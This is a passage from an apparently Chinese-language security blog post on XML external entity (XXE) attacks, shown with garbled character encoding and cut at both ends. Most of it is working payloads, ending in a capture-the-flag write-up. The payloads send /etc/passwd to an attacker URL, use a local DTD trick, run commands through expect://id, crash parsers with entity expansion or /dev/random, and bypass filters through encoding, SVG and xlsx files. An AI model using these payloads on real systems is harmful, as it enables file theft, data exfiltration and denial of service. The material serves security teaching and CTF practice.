class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;send;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>å¦‚æœç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™ååˆ†ä¸¥æ ¼ï¼Œä¸å…è®¸æˆ‘ä»¬è¯·æ±‚å¤–ç½‘æœåŠ¡å™¨dtdå‘¢ï¼Ÿç”±äºXMLçš„å¹¿æ³›ä½¿ç”¨ï¼Œå…¶å®åœ¨å„ä¸ªç³»ç»Ÿä¸­å·²ç»å­˜åœ¨äº†éƒ¨åˆ†DTDæ–‡ä»¶ã€‚æŒ‰ç…§ä¸Šé¢çš„ç†è®ºï¼Œåªè¦æ˜¯ä»å¤–éƒ¨å¼•å…¥DTDæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­å®šä¹‰ä¸€äº›å®ä½“å†…å®¹å°±è¡Œã€‚ä»”ç»†çœ‹ä¸€ä¸‹å¾ˆå¥½ç†è§£ï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨çš„å‚æ•°å®ä½“æ˜¯%remoteï¼Œåœ¨&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtdæ–‡ä»¶ä¸­è°ƒç”¨äº†%ISOamso;ï¼Œåœ¨ISOamsoå®šä¹‰çš„å®ä½“ä¸­ç›¸ç»§è°ƒç”¨äº†evalã€å’Œsendã€‚</li><li>åµŒå¥—å‚æ•°å®ä½“<br>è™½ç„¶W3Cåè®®æ˜¯ä¸å…è®¸åœ¨å†…éƒ¨çš„å®ä½“å£°æ˜ä¸­å¼•ç”¨å‚æ•°å®ä½“ï¼Œä½†æ˜¯å¾ˆå¤šXMLè§£æå™¨å¹¶æ²¡æœ‰å¾ˆå¥½çš„æ‰§è¡Œè¿™ä¸ªæ£€æŸ¥ã€‚å‡ ä¹æ‰€æœ‰XMLè§£æå™¨èƒ½å¤Ÿå‘ç°å¦‚ä¸‹è¿™ç§ä¸¤å±‚åµŒå¥—å¼çš„<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%start;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>åŸºäºæŠ¥é”™çš„ä¸‰å±‚åµŒå¥—å‚æ•°å®ä½“XXE<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">para1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">para</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>        </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">firstname</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">firstname</span>&gt;</span><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>666<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>è¿™ç§æƒ…å†µå¾ˆå°‘å‘ç”Ÿï¼Œä½†æœ‰äº›æƒ…å†µä¸‹æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡XXEæ‰§è¡Œä»£ç ï¼Œè¿™ä¸»è¦æ˜¯ç”±äºé…ç½®ä¸å½“&#x2F;å¼€å‘å†…éƒ¨åº”ç”¨å¯¼è‡´çš„ã€‚å¦‚æœæˆ‘ä»¬è¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”PHP expectæ¨¡å—è¢«åŠ è½½åˆ°äº†æ˜“å—æ”»å‡»çš„ç³»ç»Ÿæˆ–å¤„ç†XMLçš„å†…éƒ¨åº”ç”¨ç¨‹åºä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚äº¦æˆ–è€…ï¼Œå¦‚æœç›®æ ‡æ˜¯UNIXç³»ç»Ÿï¼Œ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨&#x2F;dev&#x2F;randomæ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚</p><h2 id="ç»•è¿‡XXEé˜²æŠ¤"><a href="#ç»•è¿‡XXEé˜²æŠ¤" class="headerlink" title="ç»•è¿‡XXEé˜²æŠ¤"></a>ç»•è¿‡XXEé˜²æŠ¤</h2><p>ç¼–ç ç»•è¿‡ï¼š<code>ENTITY</code> <code>SYSTEM</code> <code>file</code> ç­‰å…³é”®è¯è¢«è¿‡æ»¤ï¼Œä½¿ç”¨ç¼–ç æ–¹å¼ç»•è¿‡ï¼šUTF-16BEï¼š<code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code><br>åè®®ç»•è¿‡ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">file://åè®®åŠ æ–‡ä»¶ä¸Šä¼ </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php://filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨åœºæ™¯"><a href="#åˆ©ç”¨åœºæ™¯" class="headerlink" title="åˆ©ç”¨åœºæ™¯"></a>åˆ©ç”¨åœºæ™¯</h2><p>svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä»å½“å‰æ–‡ä»¶å¤¹è¯»å–æ–‡ä»¶å¯ä»¥ä½¿ç”¨&#x2F;proc&#x2F;self&#x2F;cwd</p><p>excel<br>é¦–å…ˆç”¨excelåˆ›å»ºä¸€ä¸ªç©ºç™½çš„xlsxï¼Œç„¶åè§£å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir XXE &amp;&amp; cd XXE</span><br><span class="line">unzip ../XXE.xlsx</span><br></pre></td></tr></table></figure><p>å°†<code>[Content_Types].xml</code>æ”¹æˆæ¶æ„xmlï¼Œå†å‹ç¼©å›å»<code>zip -r ../poc.xlsx *</code></p><h2 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h2><h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="NCTF2019 True XML cookbook"></a>NCTF2019 True XML cookbook</h3><p>è®¿é—®é¡µé¢å¹¶æŠ“åŒ…<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-2.png"><br>å‘ç°è¯·æ±‚æ˜¯xmlæ ¼å¼çš„ï¼Œé¦–å…ˆæ„é€ payloadå°è¯•è¯»å–flagï¼š<code>&lt;!ENTITY abc SYSTEM &quot;file:///flag&quot;&gt;</code>ï¼Œå¤±è´¥ï¼Œåˆšå¼€å§‹æ²¡æ‰“åˆ†å·ï¼Œxmlæœ‰æŠ¥é”™ï¼Œå‘ç°æ–‡ä»¶è·¯å¾„åœ¨<code>/var/www/html/doLogin.php</code>ï¼Œåé¢è¿˜æ˜¯ä¸è¡Œï¼Œå¯èƒ½æ˜¯æ²¡æœ‰ã€‚å°è¯•ç”¨phpåè®®ï¼Œ<code> &lt;!ENTITY abc SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt;</code><br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-3.png"><br>è§£ç åæˆåŠŸè·å¾—æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//è´¦å·</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//å¯†ç </span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹ä¸Šå»æ˜¯æ­£å¸¸çš„æ¥è€…ï¼Œä¹Ÿæ²¡æœ‰æç¤ºæœ‰å…¶ä»–çš„æ–¹å‘æˆ–æ€è·¯ï¼Œå°è¯•ç»§ç»­ç”¨ä¸Šé¢çš„åè®®è¯»å–ä¸€äº›å…¶ä»–æ–‡ä»¶ï¼Œå°è¯•è¿›è¡Œå†…ç½‘æ¢æµ‹<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-4.png"><br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-5.png"><br>å‘ç°æœ‰ä¸€ä¸ªå¥‡æ€ªçš„ipï¼Œå°è¯•è®¿é—®ä¸‹<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-6.png"><br>æœ‰æŠ¥é”™ï¼Œå°è¯•çˆ†ç ´ä¸‹ï¼Œå¤±è´¥äº†ï¼Œçœ‹ç½‘ä¸Šè§£æè¿˜éœ€è¦æŸ¥çœ‹å…¶ä»–çš„æ–‡ä»¶<code>file:///proc/net/fib_trie</code>ã€‚æ–‡ä»¶æä¾›äº†å…³äºFIBï¼ˆForwarding Information Baseï¼Œè½¬å‘ä¿¡æ¯åº“ï¼‰Trieï¼ˆå‰ç¼€æ 